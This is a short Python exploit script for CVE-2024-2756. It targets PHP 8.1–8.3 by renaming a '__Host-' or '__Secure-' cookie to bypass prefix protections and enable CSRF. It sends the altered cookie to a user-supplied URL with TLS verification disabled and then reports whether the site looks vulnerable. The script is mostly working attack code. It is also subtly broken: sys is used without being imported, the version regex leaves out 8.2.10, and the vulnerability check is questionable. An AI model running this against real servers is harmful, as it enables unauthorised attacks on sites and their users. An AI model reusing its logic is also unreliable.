# php version 8.1.11 < 8.1.28
# php version < 8.2.18
# php version < 8.3.5

# Regex:
# ^8\.1\.(1[1-9]|2[0-7])$|^8\.(2)\.(0|[1-9]|1[1-7])$|^8\.(3)\.(0|[1-4])$

# __Host-/__Secure- cookie manipulation leads to CSRF bypass


import requests
import argparse



parser = argparse.ArgumentParser(usage="""CVE-2024-2756.py -u https://*.*.*.*/ """)
parser.add_argument('--URL', '-u', help='Target URL', required=True)
args = parser.parse_args()


try:
    malicious_cookie = input("\nPut your __Host- or __Secure- you want to change: ")
    
    changed_cookie = malicious_cookie.replace("__", "_[") 
    
    cookie = {'Cookie' : f'{changed_cookie}'}
    print(f"\n[+] Changing.... [{malicious_cookie}] => [{changed_cookie}]")
    print("[+] Sending request with changed cookie......\n")
    
    response = requests.post(args.URL, headers=cookie, verify=False)
    if malicious_cookie in response.headers:
        print("Result: This application seems to be vulnerable!!\n")

    else:
        print("Result: Maybe it is not vulnerable?!\n")

except requests.RequestException:
    print("(!) Error occured in progress")
    sys.exit()